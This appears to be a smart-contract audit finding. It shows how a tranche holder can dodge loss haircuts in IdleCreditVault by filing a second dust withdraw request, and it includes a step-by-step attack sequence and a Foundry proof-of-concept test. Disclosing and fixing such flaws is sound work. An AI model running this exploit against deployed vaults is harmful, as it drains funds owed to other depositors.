### Title
Loss-adjusted withdraw receipts are paid at par when a newer request overwrites `lastWithdrawRequest`, draining other claimants' funded reserves - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
When `stopEpochWithDuration` realizes a loss, `collectWithdrawFunds` funds pending receipts only at the haircut `lossRecoveryPriceByEpoch[epochNumber]` [1](#0-0) . The haircut is later applied in `_claimLossAdjustedWithdrawRequest`, which looks up the loss epoch exclusively through `lastWithdrawRequest[_user]` [2](#0-1) . `lastWithdrawRequest[_user]` is overwritten on every new `requestWithdraw` [3](#0-2) , while the old, under-funded basis stays inside the aggregate `withdrawsRequests[_user]`. `_claimFundedWithdrawRequest` then pays that whole aggregate at par [4](#0-3) . An unprivileged tranche holder can therefore escape the loss haircut entirely and withdraw more underlying than was ever funded for their receipt.

### Finding Description
Sequence (all attacker steps, honest manager/owner in between):

1. Epoch N is running; attacker holds AA or BB tranche tokens and calls `requestWithdraw`. The strategy mints the attacker a strategy-token receipt, records `withdrawsRequestsByEpoch[attacker][N]`, and sets `lastWithdrawRequest[attacker] = N` [5](#0-4) .
2. At epoch end the manager calls `stopEpochWithDuration(_lossAmount)`. `previewLossAdjustedWithdrawFunds` splits the loss between active LPs and pending receipts [6](#0-5) , and `collectWithdrawFunds` pulls only the haircut amount, storing `lossRecoveryPriceByEpoch[N] = fundedAmount * 1e18 / pendingBasis` [7](#0-6) .
3. In epoch N+1 the attacker calls `requestWithdraw` again with a minimal amount (e.g. 1 wei of tranche). This sets `lastWithdrawRequest[attacker] = N+1` while `withdrawsRequestsByEpoch[attacker][N]` and the aggregate `withdrawsRequests[attacker]` still contain the full, unfunded epoch-N basis [3](#0-2) .
4. After epoch N+1 stops normally, the attacker calls `IdleCDOEpochVariant.claimWithdrawRequest`, which forwards to `IdleCreditVault.claimWithdrawRequest(msg.sender)` [8](#0-7) .
5. Inside the claim: `defaultRecoveryFinalized` is false, so the defaulted path is skipped; `_claimLossAdjustedWithdrawRequest` reads `lossEpoch = lastWithdrawRequest = N+1`, finds `lossRecoveryPriceByEpoch[N+1] == 0`, and returns 0 without clearing the epoch-N basis [9](#0-8) .
6. `_claimFundedWithdrawRequest` pays `amount = withdrawsRequests[attacker]` — the epoch-N full basis plus the epoch-N+1 request — at par via `_transferFundedClaim` [4](#0-3) .

The vault only ever received `epochNbasis * lossRecoveryPrice / 1e18` for the epoch-N receipt, yet it pays the full basis. No guard catches this: `epochNumber > lastWithdrawRequest` passes once N+1 stops, the strategy token receipt burn succeeds because the attacker holds the minted receipts, and `_claimLossAdjustedWithdrawRequest` can never see epoch N again because `lastWithdrawRequest` is a single slot, not a per-epoch record.

### Impact Explanation
The attacker withdraws `basis_N * (1 - lossRecoveryPrice/1e18)` more underlying than funded for their receipt — i.e., they fully dodge their pro-rata share of the realized loss. The excess is paid out of the strategy's underlying balance, which is the same reserve backing other users' funded pending withdrawals and instant claims. Other claimants' `claimWithdrawRequest`/`claimInstantWithdrawRequest` calls then revert on insufficient balance (permanent freezing of their unclaimed, already-funded yield) or the vault is drained below solvency. Quantified loss: `pendingBasis * (1 - funded/basis)` per attacking receipt, bounded only by the size of the loss-adjusted pending bucket, which the attacker controls by sizing their epoch-N request.

### Likelihood Explanation
Requirements are minimal: the attacker only needs tranche tokens and the ability to call `requestWithdraw` twice across two epochs (KYC via `isWalletAllowed` if enabled — permitted per the threat model). The trigger is a `stopEpochWithDuration` loss epoch, which is an intended manager operation for partial borrower shortfalls, not an edge case. The second request is explicitly supported (the code comments note users can stack requests across epochs). No privileged cooperation, timing race, or donation is needed — the faulty lookup is deterministic once a newer `lastWithdrawRequest` exists.

### Recommendation
`_claimLossAdjustedWithdrawRequest` must not derive the loss epoch from the mutable `lastWithdrawRequest`. Either iterate/record per-epoch loss markers (e.g. check `lossRecoveryPriceByEpoch` against each epoch present in `withdrawsRequestsByEpoch[_user]`), or track the earliest unclaimed request epoch per user separately from `lastWithdrawRequest`. Additionally, `_claimFundedWithdrawRequest` should exclude any basis belonging to epochs with a non-zero `lossRecoveryPriceByEpoch`, so loss-adjusted receipts can never fall through to the at-par funded path.

```solidity
// test/foundry/LossAdjustedClaimBypass.t.sol — fork-style, follows IdleCreditVault.t.sol harness
function testLossAdjustedReceiptPaidAtPar() external {
    // 1) attacker deposits AA and requests withdraw in epoch N
    uint256 amt = 10_000 * ONE_SCALE;
    address attacker = makeAddr('attacker');
    _depositWithUser(attacker, amt, true);
    vm.prank(attacker);
    uint256 basisN = cdoEpoch.requestWithdraw(0, address(AAtranche));

    // 2) epoch N ends with a partial loss via stopEpochWithDuration
    _startEpochAndCheckPrices(0);
    uint256 pendingBasis = IdleCreditVault(address(strategy)).pendingWithdraws();
    uint256 loss = pendingBasis / 2; // 50% receipt haircut
    deal(defaultUnderlying, borrower, pendingBasis - loss + _expectedFundsEndEpoch());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpochWithDuration(initialProvidedApr, 0, loss);

    // 3) buffer period: attacker files a dust second request -> lastWithdrawRequest = N+1
    vm.prank(attacker);
    cdoEpoch.requestWithdraw(1, address(AAtranche)); // or minimal tranche dust

    // 4) epoch N+1 runs and stops normally (borrower repays)
    _startEpochAndCheckPrices(1);
    deal(defaultUnderlying, borrower, _expectedFundsEndEpoch());
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(initialProvidedApr, 0);

    // 5) attacker claims: loss-adjusted path misses epoch N (price keyed to N, not N+1),
    //    funded path pays the FULL epoch-N basis at par
    uint256 pre = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = underlying.balanceOf(attacker) - pre;

    // funded reserve only covered basisN/2 for epoch N + dust; attacker received full basisN
    assertGt(paid, basisN * IdleCreditVault(address(strategy)).lossRecoveryPriceByEpoch(1) / 1e18,
        'attacker escaped the loss haircut');
}
```

```text
  function collectWithdrawFunds(uint256 _amount) external {
    _onlyIdleCDO();
    uint256 pendingBasis = pendingWithdraws;
    if (_amount < pendingBasis) {
      // Legacy receipts do not have per-epoch ownership data, so they can only be fully funded.
      if (!defaultRecoveryInitialized) revert NotAllowed();
      uint256 lossRecoveryPrice = _amount * RECOVERY_FULL / pendingBasis;
      // Avoid storing a zero price, which is indistinguishable from "no loss-adjusted epoch".
      if (lossRecoveryPrice == 0) revert NotAllowed();
      pendingWithdraws = 0;
      lossRecoveryPriceByEpoch[epochNumber] = lossRecoveryPrice;
    } else {
      // A plain implementation upgrade may leave legacy normal receipts pending. Their next
      // successful stop can fully fund the aggregate before lazy initialization occurs.
      pendingWithdraws = pendingBasis - _amount;
    }
    if (_amount != 0) {
      underlyingToken.safeTransferFrom(idleCDO, address(this), _amount);
    }
  }
```

```text
  function previewLossAdjustedWithdrawFunds(uint256 _lossAmount) external view returns (uint256 pendingToFund, uint256 activeLoss) {
    uint256 pendingBasis = pendingWithdraws;
    // Full zero-loss funding is safe for legacy aggregate receipts and needs no migration call.
    if (_lossAmount == 0) return (pendingBasis, _lossAmount);

    IIdleCDOEpochVariant cdo = IIdleCDOEpochVariant(idleCDO);
    uint256 activeBasis = _lossActiveBasis(cdo);
    if (pendingBasis == 0) {
      if (_lossAmount > activeBasis) revert NotAllowed();
      return (0, _lossAmount);
    }

    // Legacy pending receipts do not have the per-epoch ownership data needed to store a haircut.
    if (!defaultRecoveryInitialized) revert NotAllowed();
    uint256 totalBasis = activeBasis + pendingBasis;
    if (_lossAmount >= totalBasis) revert NotAllowed();

    uint256 pendingLoss = _lossAmount * pendingBasis / totalBasis;
    pendingToFund = pendingBasis - pendingLoss;
    activeLoss = _lossAmount - pendingLoss;
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```
